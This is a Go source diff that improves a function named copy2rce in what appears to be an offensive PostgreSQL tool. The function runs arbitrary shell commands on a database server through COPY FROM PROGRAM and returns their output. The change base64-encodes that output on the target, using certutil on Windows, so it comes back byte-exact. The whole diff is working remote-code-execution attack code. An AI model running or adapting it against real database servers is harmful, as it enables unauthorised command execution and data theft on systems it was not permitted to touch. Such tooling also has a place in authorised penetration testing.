@@ -5,6 +5,7 @@ package cmd
 
 import (
 	"context"
+	"encoding/base64"
 	"fmt"
 	"os"
 	"strconv"
@@ -136,12 +137,21 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 	ctx := context.Background()
 	salt := utils.RandStringRunes(5)
 
+	// Encode command output as base64 on the target so the COPY data parser
+	// never touches raw bytes: bare CRs, quotes and backslashes all break or
+	// corrupt COPY parsing, but pass through base64 byte-exact.
+	var serverVersion string
+	conn.QueryRow(ctx, "SELECT version()").Scan(&serverVersion)
+	if strings.Contains(strings.ToLower(serverVersion), "visual c++") {
+		// COPY FROM PROGRAM runs the command via cmd.exe on Windows
+		cmd = "( " + cmd + " ) 2>&1 | certutil -encode - -"
+	} else {
+		cmd = "( " + cmd + " ) 2>&1 | base64"
+	}
+
 	conn.Exec(ctx, fmt.Sprintf("CREATE TABLE cmd_exec%s(cmd_output text);", salt))
 	defer conn.Exec(ctx, fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec%s;", salt))
 
-	// Text COPY format eats backslashes as escape sequences (C:\Program Files
-	// becomes C:Program Files), so read program output in CSV format with
-	// control bytes as delimiter/quote to keep the output byte-exact.
 	copyQuery := fmt.Sprintf(
 		"COPY cmd_exec%s FROM PROGRAM '%s' WITH (FORMAT csv, DELIMITER E'\\x1f', QUOTE E'\\x02');",
 		salt, strings.ReplaceAll(cmd, "'", "''"),
@@ -155,19 +165,26 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 		fmt.Println("Query failed: ", err)
 	}
 
-	var output strings.Builder
+	var encoded strings.Builder
 	for rows.Next() {
-		// Empty lines come back as NULL in CSV format, so scan into a
-		// nullable string to keep them instead of failing the whole read.
 		var line *string
 		if err := rows.Scan(&line); err != nil {
 			break
 		}
-		if line != nil {
-			output.WriteString(*line)
+		if line == nil {
+			continue
 		}
-		output.WriteString("\n")
+		s := strings.TrimSpace(*line)
+		// certutil wraps encoded data in BEGIN/END CERTIFICATE markers
+		if s == "" || strings.HasPrefix(s, "-----") {
+			continue
+		}
+		encoded.WriteString(s)
 	}
 
-	return output.String()
+	decoded, err := base64.StdEncoding.DecodeString(encoded.String())
+	if err != nil {
+		return encoded.String()
+	}
+	return string(decoded)
 }
